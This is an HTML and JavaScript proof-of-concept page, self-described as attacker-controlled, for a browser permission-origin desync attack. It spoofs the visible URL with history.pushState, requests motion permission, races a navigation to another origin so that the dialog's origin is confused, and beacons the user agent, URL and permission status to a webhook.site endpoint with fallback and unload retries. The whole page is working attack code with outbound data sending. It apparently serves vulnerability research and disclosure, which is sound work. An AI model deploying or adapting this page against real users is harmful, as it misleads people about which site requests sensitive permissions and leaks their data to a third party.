<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Permission Origin Desync PoC (Hardened)</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{margin:0;font-family:-apple-system,BlinkMacSystemFont,system-ui;background:#f5f5f7;text-align:center}
button{font-size:15px;padding:12px 16px;border-radius:12px;border:none;background:#007aff;color:#fff;margin:8px}
#panel{display:none;max-width:420px;margin:80px auto;background:#fff;padding:24px;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.2)}
.notice{margin-top:14px;font-size:13px;color:#b00020}
</style>
</head>
<body>

<h2 style="margin-top:60px;">Permission Origin Confusion PoC</h2>
<p>Attacker-controlled page</p>

<button id="start">Start PoC</button>

<div id="panel">
  <h3>Request Sensitive Permission</h3>
  <p>Observe permission dialog origin</p>
  <button id="motionBtn">🧭 Enable Motion</button>
  <p id="output">Result: -</p>
  <div class="notice">Demo only — UI origin may not match JS origin</div>
</div>

<script>
/* ================= CONFIG ================= */
const WEBHOOK = 'https://webhook.site/a132a5ec-337f-46d5-958f-f8a8f9376120';

const panel  = document.getElementById('panel');
const output = document.getElementById('output');
let proofSent = false;

/* ================= PROOF PAYLOAD ================= */
function buildPayload(status, phase){
  return {
    poc: 'permission-origin-desync',
    permission: 'motion',
    status,
    phase, // before-nav | after-permission | unload-retry
    attacker_origin: location.origin,
    attacker_url: location.href,
    ua: navigator.userAgent,
    ts: Date.now()
  };
}

/* ================= SEND (TRIPLE SAFE) ================= */
function sendProof(status, phase){
  if (proofSent) return;
  proofSent = true;

  const data = JSON.stringify(buildPayload(status, phase));
  const blob = new Blob([data], {type:'application/json'});

  // 1) sendBeacon (utama)
  try { navigator.sendBeacon(WEBHOOK, blob); } catch(e){}

  // 2) Image GET fallback (querystring)
  try {
    const img = new Image();
    img.src = WEBHOOK + '?fallback=img&d=' + encodeURIComponent(data);
  } catch(e){}
}

/* ================= PERMISSION ================= */
document.getElementById('motionBtn').onclick = async () => {
  // Kirim bukti SEBELUM navigasi (status pending)
  sendProof('requested', 'before-nav');

  try {
    if (typeof DeviceMotionEvent?.requestPermission === 'function') {
      const res = await DeviceMotionEvent.requestPermission();
      output.textContent = 'Motion: ' + res;
      // Kirim lagi (hasil final)
      proofSent = false; // allow second send with final status
      sendProof(res, 'after-permission');
    } else {
      output.textContent = 'Motion API not supported';
      proofSent = false;
      sendProof('unsupported', 'after-permission');
    }
  } catch(e){
    output.textContent = 'Motion denied';
    proofSent = false;
    sendProof('error', 'after-permission');
  }

  // Navigasi dipicu SETELAH klik permission (race tetap terjadi)
  setTimeout(triggerNavigationRace, 60);
};

/* ================= ATTACK LOGIC ================= */
// Step 1: Manipulate visible URL
document.getElementById('start').onclick = () => {
  history.pushState({}, '', '/trusted/login');
  panel.style.display = 'block';
};

// Step 2: Navigation race (dipanggil setelah klik permission)
function triggerNavigationRace(){
  requestAnimationFrame(()=>{
    requestAnimationFrame(()=>{
      setTimeout(()=>{
        location.href = 'https://google.com:9090';
      }, 80);
    });
  });
}

/* ================= LAST-CHANCE RETRY ================= */
window.addEventListener('pagehide', () => {
  if (!proofSent) sendProof('unknown', 'unload-retry');
});
document.addEventListener('visibilitychange', () => {
  if (document.visibilityState === 'hidden' && !proofSent) {
    sendProof('unknown', 'unload-retry');
  }
});
</script>
</body>
</html>
